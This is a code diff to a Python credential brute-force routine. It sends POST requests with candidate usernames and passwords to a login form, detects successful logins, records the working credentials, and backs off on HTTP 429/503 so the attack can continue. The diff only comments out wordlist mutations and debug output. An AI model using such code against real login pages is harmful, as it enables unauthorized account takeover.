@@ -54,13 +54,13 @@ def bruteforce(request, url, host, port, agent,
 
     # Add all transformations for each word
     all_words = set(words)
-    transformations = transform.generate_transformations(list(words))
-    for word in words:
-        transformation = transformations[word]
-        all_words.add(transformation.lower)
-        all_words.add(transformation.upper)
-        all_words.add(transformation.reverse)
-        all_words.add(transformation.leet)
+    # transformations = transform.generate_transformations(list(words))
+    # for word in words:
+    #     transformation = transformations[word]
+    #     all_words.add(transformation.lower)
+    #     all_words.add(transformation.upper)
+    #     all_words.add(transformation.reverse)
+    #     all_words.add(transformation.leet)
     
     # Try all combinations for the form described by url on host
     content_type = HTTP_CONTENTTYPE_FORMENCODED
@@ -75,14 +75,14 @@ def bruteforce(request, url, host, port, agent,
                 response = request.send_post_request(url, host, 
                                 agent, content_type,
                                 content_length, body)
-                if not response:
+                if response is None:
                     too_many_req = False
                 else:
-                    print(f'User: {user}, Pass: {_pass} -- TEST.')
-
+                    # print(f'User: {user}, Pass: {_pass}')
+                    
                     # See if the response contained any words that indicate a successful login.
                     if verify_success_resp(tokenize_html(response.response,True)):
-                        print(f'    SUCCESS.')
+                        # print(f'    SUCCESS.')
                         if user.lower() not in success_users:
                             success.append(Credential(user.lower(),_pass))
                             success_users.add(user.lower())
@@ -93,7 +93,7 @@ def bruteforce(request, url, host, port, agent,
                     status_tuple = response.status_code
                     if status_tuple is not None:
                         status_code, __ = status_tuple
-                        print(f'     {status_code}')
+                        # print(f'     FAIL. {status_code}')
                         if status_code == "429" or status_code == "503":
                             time.sleep(sleep_time)
                         else:
